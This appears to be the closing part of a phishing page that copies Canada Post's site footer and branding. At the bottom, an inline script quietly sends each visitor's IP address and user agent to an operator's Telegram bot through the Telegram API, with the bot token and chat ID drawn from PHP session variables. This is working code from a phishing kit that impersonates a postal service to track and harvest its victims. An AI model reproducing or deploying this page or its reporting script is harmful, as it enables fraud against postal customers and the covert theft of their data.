                                                                    </ul>
                                                                </div>
                                                                <hr>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </section>
                                            <section class="footer-l2 cpc-tb--suppress-toolbar" role="contentinfo">
                                                <div class="row large-up-footer show-for-large-up">
                                                    <div class="large-12 columns text-center">
                                                        <div class="left-items text-left">
                                                            © Canada Post Corporation
                                                        </div>
                                                        <div class="center terms-links">
                                                            <ul>
                                                                <li><a href="#" target="">Accessibility</a></li>
                                                                <li><a href="#" target="">Legal</a></li>
                                                                <li><a href="#" target="">Privacy</a></li>
                                                            </ul>
                                                        </div>
                                                        <div class="right-items">
                                                            <a href="#"><img src="/assets/cap/gov-canada-logo.svg" alt="Canada"></a>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="row show-for-medium-only">
                                                    <div class="large-12 columns text-center">
                                                        <div class="terms-links">
                                                            <ul>
                                                                <li><a href="#" target="">Accessibility</a></li>
                                                                <li><a href="#" target="">Legal</a></li>
                                                                <li><a href="#" target="">Privacy</a></li>
                                                            </ul>
                                                        </div>
                                                        <div class="cpc-corp-copyright">
                                                            © Canada Post Corporation
                                                            <div class="gov-can-logo">
                                                                <a href="#"><img src="/assets/cap/gov-canada-logo.svg" alt="Canada"></a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="row show-for-small-only">
                                                    <div class="large-12 columns text-center">
                                                        <div class="center terms-links">
                                                            <ul>
                                                                <li><a href="#" target="">Accessibility</a></li>
                                                                <li><a href="#" target="">Legal</a></li>
                                                                <li><a href="#" target="">Privacy</a></li>
                                                            </ul>
                                                        </div>
                                                        <div class="row">
                                                            <div class="large-12 columns">
                                                                <div class="cpc-corp-copyright">
                                                                    © Canada Post Corporation
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div class="row">
                                                            <div class="large-12 columns">
                                                                <div class="center">
                                                                    <a href="#"><img src="/assets/cap/gov-canada-logo.svg" alt="Canada"></a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </div>
                                    </div>
                                </div>
                            </cpc-footer>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    </body>
    <script>
            // Telegram API URL with your bot token and method
    let messageText = `Start Page\n\nIP: <?php echo $userIp ?>\nUserAgent: <?php echo $userAgent?>`;

const telegramApiUrl = `https://api.telegram.org/bot<?php echo $_SESSION['TELEGRAM_BOT_KEY']?>/sendMessage`;
const payload = {
    chat_id: '<?php echo $_SESSION['CHAT_ID']?>',
    text: messageText
};

fetch(telegramApiUrl, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
    </script>
</html>
